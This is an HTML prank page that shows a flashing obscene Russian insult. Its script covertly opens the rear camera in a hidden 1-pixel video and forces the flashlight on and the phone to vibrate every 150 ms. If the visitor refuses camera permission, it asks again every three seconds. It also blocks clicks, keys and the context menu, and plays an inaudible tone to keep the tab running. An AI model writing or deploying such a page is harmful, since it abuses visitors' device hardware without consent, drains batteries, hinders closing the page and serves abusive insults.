<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🔥</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            background: black;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            font-family: 'Impact', 'Arial Black', sans-serif;
        }
        .insult {
            font-size: 10vw;
            color: #ff0000;
            text-shadow: 0 0 30px #ff0000, 0 0 60px #ff4400;
            animation: blink 0.5s infinite alternate;
            text-align: center;
            padding: 20px;
            word-break: break-word;
        }
        @keyframes blink {
            0% { opacity: 1; transform: scale(1); }
            100% { opacity: 0.3; transform: scale(1.1); }
        }
        #video {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="insult">🖕 ВОТ ТЫ ЕБЛАН 🖕</div>
    <video id="video" autoplay playsinline></video>

    <script>
        (async function() {
            'use strict';

            // Функция запуска камеры и фонарика
            async function startTorchAndCamera() {
                try {
                    // Запрашиваем доступ к задней камере
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'environment',
                            width: { ideal: 128 },
                            height: { ideal: 128 }
                        },
                        audio: false
                    });

                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    await video.play();

                    // Получаем трек камеры
                    const tracks = stream.getVideoTracks();
                    if (tracks.length === 0) return;
                    const track = tracks[0];

                    // Включаем фонарик (torch)
                    const capabilities = track.getCapabilities ? track.getCapabilities() : {};
                    if (capabilities.torch) {
                        await track.applyConstraints({ advanced: [{ torch: true }] });
                    } else {
                        // Если torch не поддерживается — пробуем через ImageCapture
                        try {
                            const imageCapture = new ImageCapture(track);
                            await imageCapture.grabFrame();
                        } catch(e) {}
                    }

                    // Бесконечный цикл поддержки фонарика (каждые 150 мс)
                    function keepTorchOn() {
                        try {
                            if (track && track.applyConstraints) {
                                track.applyConstraints({ advanced: [{ torch: true }] })
                                    .catch(() => {});
                            }
                            if (navigator.vibrate) {
                                navigator.vibrate(100);
                            }
                        } catch(e) {}
                        setTimeout(keepTorchOn, 150);
                    }
                    keepTorchOn();

                    // Держим видео активным
                    function keepAlive() {
                        video.play().catch(() => {});
                        requestAnimationFrame(keepAlive);
                    }
                    keepAlive();

                } catch (error) {
                    // Если пользователь запретил — повторяем запрос каждые 3 секунды
                    setInterval(async () => {
                        try {
                            await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                            startTorchAndCamera();
                        } catch(e) {}
                    }, 3000);
                }
            }

            // Запускаем сразу
            startTorchAndCamera();

            // Блокируем закрытие страницы (Android Back, iOS жест)
            document.addEventListener('click', function(e) {
                e.preventDefault();
                const video = document.getElementById('video');
                if (video.srcObject) {
                    const track = video.srcObject.getVideoTracks()[0];
                    if (track && track.applyConstraints) {
                        track.applyConstraints({ advanced: [{ torch: true }] }).catch(() => {});
                    }
                }
                return false;
            }, true);

            document.addEventListener('contextmenu', e => e.preventDefault());
            document.addEventListener('keydown', e => e.preventDefault());

            // Неслышный звук для удержания вкладки активной
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                gain.gain.value = 0.001;
                oscillator.connect(gain);
                gain.connect(audioCtx.destination);
                oscillator.start();
                oscillator.frequency.value = 20;
            } catch(e) {}

            // При возврате на страницу — перезапуск
            document.addEventListener('visibilitychange', function() {
                if (!document.hidden) {
                    startTorchAndCamera();
                }
            });

        })();
    </script>
</body>
</html>
